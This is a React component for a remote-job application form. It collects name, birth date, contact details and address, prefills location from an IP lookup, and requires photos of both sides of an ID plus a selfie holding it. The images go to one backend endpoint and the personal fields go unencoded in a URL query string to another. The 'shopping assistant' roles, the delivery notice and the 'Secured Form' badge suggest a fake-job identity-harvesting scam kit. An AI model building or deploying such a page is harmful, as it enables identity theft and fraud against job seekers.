import React, { useEffect, useState } from 'react'
import { BsFillShieldLockFill } from 'react-icons/bs'
import { ImSpinner2 } from 'react-icons/im'
import axios from 'axios'
import ProgressBar from './components/progress_bar'
import ModalPage from './components/Modal';
import Button from 'react-bootstrap/Button';
import Header from './components/Header'
import Footer from './components/Footer'





const Forms = () => {
  const [fn, setFn] = useState('')
  const [dob, setDob] = useState('')
  const [email, setEmail] = useState('')
  const [number, setNumber] = useState('')
  const [eq, setEq] = useState('')
  const [pd, setPd] = useState('')
  const [address, setAddress] = useState('')
  const [city, setCity] = useState('')
  const [state, setState] = useState('')
  const [zip, setZip] = useState('')
  const [gender, setGender] = useState('')

  
  const [fnProg, setFnProg] = useState(0)
  const [dobProg, setDobProg] = useState(0)
  const [emailProg, setEmailProg] = useState(0)
  const [numberProg, setNumberProg] = useState(0)
  const [eqProg, setEqProg] = useState(0)
  const [pdProg, setPdProg] = useState(0)
  const [addressProg, setAddressProg] = useState(0)
  const [cityProg, setCityProg] = useState(0)
  const [stateProg, setStateProg] = useState(0)
  const [zipProg, setZipProg] = useState(0)
  const [genderProg, setGenderProg] = useState(0)
  const [q1Prog, setQ1Prog] = useState(0)
  const [q2Prog, setQ2Prog] = useState(0)
  const [q3Prog, setQ3Prog] = useState(0)


  const [opacityShow, setOpacityShow] = useState('inputFile');
  const [opacityShowTwo, setOpacityShowTwo] = useState('inputFile');
  const [opacityShowThree, setOpacityShowThree] = useState('inputFile');
  const [q1, setQ1] = useState('')
  const [q2, setQ2] = useState('')
  const [q3, setQ3] = useState('')
  const [image, setImage] = useState('')
  const [imageTwo, setImageTwo] = useState('')
  const [imageThree, setImageThree] = useState('')
  const[isLoading, setIsLoading] = useState(false)
  const [pageNext, setPageNext] = useState(true)
  const [pageTwo, setPageTwo] = useState(false)
  const [pageThree, setPageThree] = useState()
  const [mssge, setMssge] = useState(false)
  const [country, setCountry] = useState('')
  const url = "https://ipapi.co/json/"
  const [show, setShow] = useState(false);

  const handleClose = () => {
    setShow(false)
    handleProgressCheck()
  };
  const handleShow = () => setShow(true);

  const handleProgressCheck = ()=> {
    if(fn!==''){
      setFnProg(7)
    }else{
      setFnProg(0)
    }
  if(gender!==''){
        setGenderProg(7)
      }else{
        setGenderProg(0)
      }
  if(dob!==''){
        setDobProg(7)
      }else{
        setDobProg(0)
      }
  if(email!==''){
        setEmailProg(7)
      }else{
        setEmailProg(0)
      }
  if(number!==''){
        setNumberProg(7)
      }else{
        setNumberProg(0)
      }
  if(eq!==''){
        setEqProg(7)
      }else{
        setEqProg(0)
      }
  if(pd!==''){
        setPdProg(7)
      }else{
        setPdProg(0)
      }
  if(address!==''){
        setAddressProg(7)
      }else{
        setAddressProg(0)
      }
  if(city!==''){
        setCityProg(7)
      }else{
        setCityProg(0)
      }
  if(state!==''){
        setStateProg(7)
      }else{
        setStateProg(0)
      }
  if(q1!==''){
        setQ1Prog(7)
      }else{
        setQ1Prog(0)
      }
  if(q2!==''){
        setQ2Prog(7)
      }else{
        setQ2Prog(0)
      }
  if(q3!==''){
        setQ3Prog(7)
      }else{
        setQ3Prog(0)
      }
  if(zip!=='' || zip !== null){
        setZipProg(7)
      }else{
        setZipProg(0)
      }
  }

  useEffect(()=> {
    fetch(url, {
      method: "GET"
    })
    .then(res => {
      return res.json()
    })
    .then(resData => {
      setCity(resData.city)
      setCountry(resData.country_name)
      setState(resData.region)
      setZip(resData.postal)
      handleShow()
    })

  }, [])

  const progress = fnProg+dobProg+emailProg+numberProg+eqProg+pdProg+addressProg+cityProg+stateProg+zipProg+genderProg+q1Prog+q2Prog + q3Prog+2

  const HandleNextPage = () => {
    if (fn === '' || dob ==='' || gender ==='' || email ==='' || number ==='' || eq ==='' || pd ==='' || address ==='' || city ==='' || state ==='' || zip ===''){
      setMssge("All field must be filled correctly");
    }else {
      setPageNext(false)
      setPageTwo(true)
      setPageThree(false)
      setMssge(false)
    }
  } 

  const handleNextTwo = ()=> {
    if (q1 === '' || q2 ==='' || q3 ===''){
      setMssge("All field must be filled correctly");
    }else {
      setMssge(false)
      const urlSend = 'https://backend.com/process.php?action=submitForm&fullName=' + fn + '&dob=' + dob + '&email=' + email + '&number=' + number +'&eq=' + eq +'&pd=' + pd + '&address=' + address + '&city=' + city +'&state=' + state + '&zip=' + zip + '&gender=' + gender;
      window.location.replace(urlSend)
    }
  }


  const handleImageUpload = (e)=> {
    console.log(e.target.files)
    setImage(e.target.files[0])
    setOpacityShow('opacityShow')


  }
  const handleImageUploadBack = (e) => {
    console.log(e.target.files)
    setImageTwo(e.target.files[0])
    setOpacityShowTwo('opacityShow')

  }


  const handleImageUploadFull = (e) => {
    console.log(e.target.files)
    setImageThree(e.target.files[0])
    setOpacityShowThree('opacityShow')

  }


  const handleFormSubmit = (event) => {
    event.preventDefault();
    setIsLoading(true)
    
    const imgData = new FormData()
    imgData.append('image', imageTwo)


    const formData = new FormData();
    formData.append('image', image);
    
    const imgData3 = new FormData();
    imgData3.append('image', imageThree);

    const url = 'https://backend.com/upload.php';
    //const url = 'http://localhost/New%20folder//upload.php';

    
    axios.post(url, formData).then(res => {
      console.log(res.data);
    }).catch((err)=> {
      setMssge(err.message);
      setIsLoading(false)
    }).then(()=>{
      axios.post(url, imgData).then(res => {
        console.log(res.data);
      }).catch((err)=> {
        setMssge(err.message);
        setIsLoading(false)
      }).then(()=> {
        axios.post(url, imgData3).then(res => {
          console.log(res.data)
        }).catch(err => {
          setMssge(err.message)
          setIsLoading(false)
        }).then(() => {
          if (q1 === '' || q2 ==='' || q3 ===''){
            setMssge("All field must be filled correctly");
          }else {
            setMssge(false)
            const urlSend = 'https://backend.com/process.php?action=submitForm&fullName=' + fn + '&dob=' + dob + '&email=' + email + '&number=' + number +'&eq=' + eq +'&pd=' + pd + '&address=' + address + '&city=' + city +'&state=' + state + '&zip=' + zip + '&gender=' + gender;
            window.location.replace(urlSend)
          }
         setIsLoading(false)
        })
      })
      
    })
    
  }
  
  
  return (
    <div>
      <Header />
      <form className="App2" onSubmit={handleFormSubmit} >

        <div className="top-flag">
          <h3>
            Please use correct information, items may need to be delivered
          </h3>
        </div>
        <ModalPage show={show} handleClose={handleClose} city={city} country={country} state={state} zip={zip} />
          
        
        {pageNext && <div className="write-container4">
          <div className="text-box2">
            <h3>Full Name (s) <br />First Name, Last Name and Other Names</h3>
            <input type="text" 
            value={fn}
            onBlur={() => {
              handleProgressCheck()
            }}
            required
            onChange={
              (e) => setFn(e.target.value)
              } />
            <div className="required">
              Required
            </div>
          </div>
        </div>}

        {pageNext && <div className="write-container">
          <div className="text-box2">
            <h3>Gender</h3><br />
            <input type="radio"
             id='male' 
             name='gender' 
             value={"male"} 
             required
             onClick={()=> {
              setGender('Male')
              handleProgressCheck()
             }}/>
            <label style={{marginLeft:10}} htmlFor='male'>Male</label><br />

            <input type="radio"
             id='female'
             name='gender' 
             value="Female"
             required
             onClick={() => {
              setGender('Female')
              handleProgressCheck()
             }} />
            <label style={{marginLeft:10}} htmlFor='female'>Female</label><br />

            {/* <input type="radio"
             id='rns'
             name='gender' 
             value="Rather Not Say"
             required
             onClick={() => {
              setGender('Rather Not Say')
              handleProgressCheck()
             }} />
            <label style={{marginLeft:10}} htmlFor='rns'>Rather Not Say</label> */}

            <div className="required">
              Required
            </div>
          </div>
        </div>}

        {pageNext && <div className="write-container">
          <div className="text-box2">
            <h3 title='Date Of Birth'>D.O.B</h3>
            <input type="date"
            value={dob}
            required
            onChange={(e) => {
              setDob(e.target.value)
              handleProgressCheck()
            }} />
            <div className="required">
              Required
            </div>
          </div>
        </div>}

        {pageNext && <div className="write-container">
          <div className="text-box2">
            <h3>Email Address</h3>
            <input type="email"
            value={email}
            onBlur={() => {
              handleProgressCheck()
            }}
            required
            onChange={(e) => setEmail(e.target.value)} />
            <div className="required">
              Required
            </div>
          </div>
        </div>}

        {pageNext && <div className="write-container">
          <div className="text-box2">
            <h3>Mobile Number</h3>
            <input type="tel"
            value={number}
            onBlur={() => {
              handleProgressCheck()
            }}
            required
            onChange={(e) => setNumber(e.target.value)} />
            <div className="required">
              Required
            </div>
          </div>
        </div>}

        {pageNext && <div className="write-container">
          <div className="text-box2">
            <h3>Educational Qualification</h3>
            <select
             value={eq} 
             required 
             onChange={(e)=> {
              setEq(e.target.value)
              handleProgressCheck()
              }} 
              id="">
              <option value="">Select Qualifications</option>
              <option value="high school">High School</option>
              <option value="college">College</option>
              <option value="university">University</option>
              <option value="masters">Masters</option>
              <option value="phd">PHD</option>
              <option value="others">others</option>
             </select>
            <div className="required">
              Required
            </div>
          </div>
        </div>}

        {pageNext && <div className="write-container">
          <div className="text-box2">
            <h3>Preferred Designation</h3>
            <select
             value={pd} 
             required 
             onChange={(e)=> {
              setPd(e.target.value)
              handleProgressCheck()
             }} 
             id="">
              <option value="">Select Qualifications</option>
              <option value="Financial Clerk">Financial Clerk</option>
              <option value="Virtual Assistant">Virtual Assistant</option>
              <option value="Shopping Assistant">Shopping Assistant</option>
             </select>
            <div className="required">
              Required
            </div>
          </div>
        </div>}

        {pageNext && <div className="write-container">
          <div className="text-box2">
            <h3>Address</h3>
            <input type="text"
            value={address}
            onBlur={() => {
              handleProgressCheck()
            }}
            required
            onChange={(e) => setAddress(e.target.value)} />
            <div className="required">
              Required
            </div>
          </div>
        </div>}

        {pageNext && <div className="write-container">
          <div className="text-box2">
            <h3>City</h3>
            <input type="text"
            value={city}
            onBlur={() => {
              handleProgressCheck()
            }}
            required
            onChange={(e) => setCity(e.target.value)} />
            <div className="required">
              Required
            </div>
          </div>
        </div>}

        {pageNext && <div className="write-container">
          <div className="text-box2">
            <h3>State</h3>
            <input type="text"
            value={state}
            onBlur={() => {
              handleProgressCheck()
            }}
            required
            onChange={(e) => setState(e.target.value)} />
            <div className="required">
              Required
            </div>
          </div>
        </div>}

        {pageTwo && <div className="write-container">
          <div className="text-box2">
            <h3>How do you feel about working fully remotely - have you done this before?</h3>
            <input type="text"
            value={q1}
            onBlur={() => {
              handleProgressCheck()
            }}
            required
            placeholder='Short-Answer-text'
            onChange={(e) => setQ1(e.target.value)} />
            <div className="required">
              Required
            </div>
          </div>
        </div>}

        {pageTwo && <div className="write-container">
          <div className="text-box2">
            <h3>What motivates you to do your best work</h3>
            <input type="text"
            value={q2}
            onBlur={() => {
              handleProgressCheck()
            }}
            required
            placeholder='Short-Answer'
            onChange={(e) => setQ2(e.target.value)} />
            <div className="required">
              Required
            </div>
          </div>
        </div>}

        {pageTwo && <div className="write-container">
          <div className="text-box2">
            <h3>What do you do when you have a great deal of work to accomplish <br /> in a short period of time</h3>
            <input type="text"
            value={q3}
            onBlur={() => {
              handleProgressCheck()
            }}
            required
            placeholder='Short-Answer'
            onChange={(e) => setQ3(e.target.value)} />
            <div className="required">
              Required
            </div>
          </div>
        </div>}

        {pageNext && <div className="write-container">
          <div className="text-box2">
            <h3>Zip Code</h3>
            <input type="number"
            value={zip}
            onBlur={() => {
              handleProgressCheck()
            }}
            required
            onChange={(e) => setZip(e.target.value)} />
            <div className="required">
              Required
            </div>
          </div>
        </div>}


        {pageThree && <div className="write-container">
          <div className="text-box2">
            <h3>Upload a valid ID/Driver's License (Front)</h3><br />
            <div className="btn btn-proc" style={{width: "60px"}} >Upload </div>
            <input type="file" required className={opacityShow} onChange={handleImageUpload} />
            <div className="required">
              Required 
              
            </div>
          </div>
        </div>}

        {pageThree && <div className="write-container">
          <div className="text-box2">
            <h3>Upload valid ID/Driver's License (BACK)</h3><br />
            <div className="btn btn-proc" style={{width: "60px"}}>Upload</div>
            <input type="file" required className={opacityShowTwo} onChange={handleImageUploadBack} />
            <div className="required">
              Required
            </div>
          </div>
        </div>}

        {pageThree && <div className="write-container">
          <div className="text-box2">
            <h3>Upload a picture of you holding up your ID</h3><br />
            <div className="btn btn-proc" style={{width: "60px"}} >Upload </div>
            <input type="file" required className={opacityShowThree} onChange={handleImageUploadFull} />
            <div className="required">
              Required 
              
            </div>
          </div>
        </div>}

        {mssge && <div className="message">{mssge}</div> }

        {pageTwo && <div className="submitRty">
          {!isLoading && 
          <Button style={{backgroundColor:"#ff7a3d",borderColor:"#ff7a3d"}} onClick={handleFormSubmit}>
             <span>Submit Application</span>
          </Button>}
          {isLoading && <Button style={{backgroundColor:"#ff7a3d",borderColor:"#ff7a3d"}} disabled className='btnRty sub-btnRty'>
             <span title='please wait Application is processing'> Processing Application <ImSpinner2 className='App-spin' /></span>
          </Button>}
        </div>}
        {pageNext && <div className="submitRty" style={{marginTop: "30px"}}>
          <Button style={{backgroundColor:"#ff7a3d",borderColor:"#ff7a3d"}} onClick={()=> HandleNextPage()}>
             <span style={{color: "#fff"}}>  Next  </span>
          </Button>
        </div>}
        {pageThree && <div className="submitRty" style={{marginTop: "30px"}}>
          <Button style={{backgroundColor:"#ff7a3d",borderColor:"#ff7a3d"}} className='btnRty sub-btnRty' onClick={()=> handleNextTwo()}>
             <span>  Verify Me  </span>
          </Button>
        </div>}
      </form>

      <div className="powered" bg="primary">
        
        <h3>
         <BsFillShieldLockFill className='secure-icon' /> Secured Form 
        </h3>
      </div>
      <Footer />
      <div className="progressrty">
        <ProgressBar
          bgcolor="#ff7a3d"
          progress={progress}
          height={20}
        />
      </div>
    </div>
  )
}

export default Forms
